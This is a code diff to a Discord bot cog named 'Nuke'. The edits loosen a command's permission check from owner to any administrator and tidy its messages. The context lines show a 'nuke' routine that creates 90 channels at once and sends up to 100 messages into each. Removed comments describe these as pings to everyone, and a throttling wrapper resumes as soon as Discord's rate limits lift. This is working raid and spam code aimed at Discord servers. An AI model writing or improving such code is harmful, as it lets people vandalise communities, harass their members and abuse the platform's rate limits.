@@ -77,15 +77,15 @@ class Nuke(commands.Cog):
         self.bot = bot
 
     @commands.command(name="sync")
-    @commands.is_owner()
+    @commands.has_permissions(administrator=True)
     async def sync(self, ctx: commands.Context):
-        """Force syncs slash commands to Discord."""
-        await ctx.send("Syncing commands...")
+        """Force syncs slash commands."""
+        msg = await ctx.send("Syncing...")
         try:
             synced = await self.bot.tree.sync()
-            await ctx.send(f"Synced {len(synced)} command(s).")
+            await msg.edit(content=f"✅ Synced {len(synced)} command(s).")
         except Exception as e:
-            await ctx.send(f"Failed to sync: {e}")
+            await msg.edit(content=f"❌ Failed to sync: {e}")
 
     @commands.command(name="nuke", aliases=NUKE_ALIASES[1:])
     @commands.has_permissions(administrator=True)
@@ -193,7 +193,6 @@ class Nuke(commands.Cog):
 
         async def create_and_spam(_i: int) -> bool:
             try:
-                # Create the channel as fast as the BucketGuard allows
                 channel = await GUARD.run(
                     f"channel_create:{guild.id}",
                     lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"),
@@ -202,7 +201,6 @@ class Nuke(commands.Cog):
                 err("create channel", e)
                 return False
 
-            # Ping everyone in the new channel immediately
             for _ in range(100):
                 try:
                     await GUARD.run(
@@ -216,8 +214,6 @@ class Nuke(commands.Cog):
                     break
             return True
 
-        # Fire all 90 tasks simultaneously. 
-        # The BucketGuard will pause the ones that hit a 429, then resume them instantly.
         results = await asyncio.gather(*(create_and_spam(i) for i in range(90)), return_exceptions=True)
         counts["created"] = sum(1 for r in results if r is True)
 
